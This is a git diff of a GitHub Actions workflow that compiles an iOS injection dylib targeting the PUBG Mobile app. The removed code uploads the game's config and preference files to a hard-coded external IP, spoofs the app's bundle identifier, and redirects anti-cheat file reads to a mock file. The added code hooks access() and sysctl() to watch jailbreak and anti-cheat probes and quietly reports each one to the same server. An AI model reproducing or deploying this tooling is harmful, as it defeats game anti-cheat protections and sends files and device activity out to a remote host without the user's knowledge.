@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V63.0 MANUAL TRIGGER
+name: Imperial Question Radar - V64.0 MONITOR
 
 on:
   push:
@@ -6,14 +6,14 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_ultimate:
+  build_radar:
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Create Imperial Source
+      - name: Create Radar Source
         run: |
           mkdir -p jni
           cat <<'EOF' > jni/main.mm
@@ -22,87 +22,64 @@ jobs:
           #import <WebKit/WebKit.h>
           #include <mach-o/dyld.h>
           #include <sys/stat.h>
-          #include <objc/runtime.h>
-          #include <stdint.h>
+          #include <sys/sysctl.h>
+          #include <unistd.h>
+          #include <time.h>
 
           // ==========================================
-          // [ 1. الإعدادات والروابط - 34.204.178.160 ]
+          // [ 1. إعدادات الرادار - مسعود الإمبراطور ]
           // ==========================================
-          #define SERVER_IP @"34.204.178.160"
+          #define RADAR_URL @"http://34.204.178.160:5001/ask"
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
 
-          // متغيرات التحكم (كل شيء مطفي في البداية)
-          static BOOL isGhostActive = NO;
-          static BOOL isOfficialSpoofed = NO;
+          // دالة إرسال "السؤال" الملقوف إلى السيرفر
+          void SendQuestion(NSString *category, NSString *content) {
+              time_t now; time(&now);
+              char *dt = ctime(&now);
+              if (dt) dt[strlen(dt)-1] = '\0'; // حذف سطر النهاية
 
-          void RemoteLog(NSString *msg) {
-              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"[V63 Manual] -> %@", msg]};
-              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/log", SERVER_IP]];
+              NSDictionary *json = @{
+                  @"category": category,
+                  @"content": content,
+                  @"time": [NSString stringWithUTF8String:dt ?: "N/A"]
+              };
+              
+              NSURL *url = [NSURL URLWithString:RADAR_URL];
               NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
               [req setHTTPBody:[NSJSONSerialization dataWithJSONObject:json options:0 error:nil]];
+              
+              // إرسال صامت في الخلفية
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-          }
-
-          // إصلاح إرسال الملفات لضمان وصولها للمجلد
-          void SendRaidFile(NSString *path) {
-              NSData *data = [NSData dataWithContentsOfFile:path];
-              if (!data) return;
-              
-              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/upload", SERVER_IP]];
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-              [req setHTTPMethod:@"POST"];
-              
-              NSString *boundary = @"ImpV63Boundary";
-              [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
-              
-              NSMutableData *body = [NSMutableData data];
-              [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-              [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n", [path lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
-              [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-              [body appendData:data];
-              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
-              
-              [req setHTTPBody:body];
-              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              RemoteLog([NSString stringWithFormat:@"✅ File Sent: %@", [path lastPathComponent]]);
           }
 
           // ==========================================
-          // [ 2. محرك التزييف اليدوي (Ghost FS) ]
+          // [ 2. محرك اللقف (System Call Hooks) ]
           // ==========================================
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
           #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
 
-          FILE* ghost_fopen(const char* p, const char* m) {
-              // لا يزيف إلا إذا فعلت الزر من المنيو
-              if (isGhostActive && p && (strstr(p, "config.json") || strstr(p, "GCloud") || strstr(p, "tss_ano") || strstr(p, "RemoteConfig"))) {
-                  RemoteLog([NSString stringWithFormat:@"🛰️ Redirecting: %s", p]);
-                  return fopen("/var/mobile/Documents/clean_mock.dat", m);
+          // لقف السؤال عن وجود الملفات (access)
+          int hk_access(const char *path, int mode) {
+              if (path && (strstr(path, "Cydia") || strstr(path, "Shadow") || strstr(path, "lib") || strstr(path, ".dat"))) {
+                  SendQuestion(@"File Check 📂", [NSString stringWithFormat:@"اللعبة تسأل: هل ملف %s موجود؟", path]);
               }
-              return fopen(p, m);
+              return access(path, mode);
           }
-          INTERPOSE(ghost_fopen, fopen);
+          INTERPOSE(hk_access, access);
+
+          // لقف السؤال عن معلومات النظام (sysctl)
+          int hk_sysctl(int *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
+              SendQuestion(@"System Info ⚙️", @"اللعبة تطلب معلومات النظام أو المعالج (sysctl)");
+              return sysctl(name, namelen, oldp, oldlenp, newp, newlen);
+          }
+          INTERPOSE(hk_sysctl, sysctl);
 
           // ==========================================
-          // [ 3. تزييف الهوية الرسمية (يدوي) ]
+          // [ 3. الواجهة الإمبراطورية المتحركة ]
           // ==========================================
-          void SetupOfficialSpoof() {
-              if (isOfficialSpoofed) return;
-              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
-              method_setImplementation(m, imp_implementationWithBlock(^NSString* (id self) {
-                  return @"com.tencent.ig"; 
-              }));
-              isOfficialSpoofed = YES;
-              RemoteLog(@"🛡️ Official Identity Activated ✅");
-          }
-
-          // ==========================================
-          // [ 4. الواجهة المتحركة والمربعات ]
-          // ==========================================
-          @interface ImperialUI : UIWindow <WKScriptMessageHandler>
-          @property (nonatomic, strong) WKWebView *web;
+          @interface ImperialUI : UIWindow
           @property (nonatomic, assign) CGPoint lastLocation;
           @end
 
@@ -119,33 +96,14 @@ jobs:
           }
 
           - (void)setupUI {
-              // الزر المتحرك
               UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
               btn.frame = CGRectMake(20, 150, 60, 60);
-              [btn setTitle:@"👑" forState:UIControlStateNormal];
+              [btn setTitle:@"🛰️" forState:UIControlStateNormal];
               btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.8];
               btn.layer.cornerRadius = 30;
-              [btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
+              btn.layer.borderColor = ImperialGold.CGColor;
+              btn.layer.borderWidth = 1.0;
               [self addSubview:btn];
-
-              // المنيو
-              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 220, 280, 420)];
-              self.web.layer.cornerRadius = 25; 
-              self.web.layer.borderColor = ImperialGold.CGColor;
-              self.web.layer.borderWidth = 3.0; self.web.hidden = YES;
-
-              NSString *html = @"<html><style>body{background:rgba(10,10,10,0.95);color:gold;font-family:sans-serif;padding:25px;}"
-              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
-              "input{width:28px;height:28px;}</style><body>"
-              "<h3 style='text-align:center'>IMPERIAL V63</h3>"
-              "<div class='row'><span>Ghost FS</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
-              "<div class='row'><span>Official ID</span><input type='checkbox' onclick='send(\"Official\")'></div>"
-              "<div class='row'><span>Raid Files</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
-              "<script>function send(a){window.webkit.messageHandlers.Imp.postMessage(a);}</script></body></html>";
-
-              [self.web loadHTMLString:html baseURL:nil];
-              [[self.web configuration].userContentController addScriptMessageHandler:self name:@"Imp"];
-              [self addSubview:self.web];
 
               UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
               [self addGestureRecognizer:pan];
@@ -156,39 +114,27 @@ jobs:
               CGPoint translation = [gesture translationInView:self];
               self.center = CGPointMake(self.lastLocation.x + translation.x, self.lastLocation.y + translation.y);
           }
-
-          - (void)toggle { self.web.hidden = !self.web.hidden; }
-
-          - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
-              if ([m.body isEqualToString:@"Ghost"]) { isGhostActive = !isGhostActive; RemoteLog(@"Ghost FS Toggled"); }
-              if ([m.body isEqualToString:@"Official"]) SetupOfficialSpoof();
-              if ([m.body isEqualToString:@"Raid"]) {
-                  SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
-                  SendRaidFile(@"/var/mobile/Library/Preferences/com.tencent.ig.plist");
-              }
-          }
           @end
 
           __attribute__((constructor))
           static void entry() {
-              // تأخير ظهور الواجهة لضمان استقرار اللعبة
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                   static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
-                  RemoteLog(@"✅ UI Loaded - Wait for Lobby to activate");
+                  SendQuestion(@"System", @"✅ رادار الأسئلة شغال وجاهز للصيد");
               });
           }
           EOF
 
-      - name: Build Imperial Nuclear Dylib
+      - name: Build Radar Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
-          -framework Foundation -framework UIKit -framework WebKit -framework CoreGraphics -framework Security -lobjc
+          -arch arm64 jni/main.mm -o ImperialRadar.dylib \
+          -framework Foundation -framework UIKit -framework CoreGraphics -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-V63-Manual
-          path: ImperialUltimate.dylib
+          name: Imperial-Radar-V64
+          path: ImperialRadar.dylib
           
